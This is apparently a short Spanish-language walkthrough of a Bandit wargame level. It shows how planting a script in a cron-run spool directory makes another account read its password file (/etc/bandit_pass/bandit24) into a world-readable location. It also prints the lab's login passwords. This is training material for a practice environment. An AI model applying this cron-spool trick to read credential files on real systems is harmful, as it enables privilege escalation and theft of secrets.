
# Level 23 al 24
## Objetivos
A program is running automatically at regular intervals from **cron**, the time-based job scheduler. Look in **/etc/cron.d/** for the configuration and see what command is being executed.
**NOTE:** This level requires you to create your own first shell-script. This is a very big step and you should be proud of yourself when you beat this level!
**NOTE 2:** Keep in mind that your shell script is removed once executed, so you may want to keep a copy around…
## datos de acceso
bandit23
QYw0Y2aiA672PsMmh9puTQuhoz8SyR2G
## Solucion
```bash
bandit23@bandit:~$
bandit23@bandit:~$ mkdir /tmp/passtmp
bandit23@bandit:~$ cd /tmp/passtmp
bandit23@bandit:/tmp/passtmp$ echo "cat /etc/bandit_pass/bandit24 >> /tmp/passtmp/password" > passtmp.sh
bandit23@bandit:/tmp/passtmp$ cat passtmp.sh
cat /etc/bandit_pass/bandit24 >> /tmp/passtmp/password
bandit23@bandit:/tmp/passtmp$ chmod 777 passtmp.sh
bandit23@bandit:/tmp/passtmp$ touch password
bandit23@bandit:/tmp/passtmp$ chmod 666 password
bandit23@bandit:/tmp/passtmp$ cp passtmp.sh /var/spool/bandit24/foo
bandit23@bandit:/tmp/passtmp$ cat password
VAfGXJ1PBSsPSnvsjI8p759leLZ9GGar
bandit23@bandit:/tmp/passtmp$
```
## Notas adicionales
 Creamos un script
 damos permisos
 leemos el script
## Referencias


